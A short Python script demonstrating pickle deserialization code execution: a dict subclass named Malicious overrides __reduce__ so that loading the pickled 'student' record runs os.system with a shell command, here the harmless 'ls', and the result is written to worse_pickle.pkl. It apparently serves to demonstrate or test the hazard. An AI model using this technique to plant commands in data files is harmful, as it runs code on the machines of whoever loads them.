import pickle
import os

class Malicious(dict):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)

    def __reduce__(self):
        return os.system, (f"ls or dict()",), None, None, iter(self.items())


student = Malicious(**{
    "name": "John",
    "age": 30,
    "courses": ["Math", "Science"]
})

with open("worse_pickle.pkl", "wb") as f:
    pickle.dump(student, f)
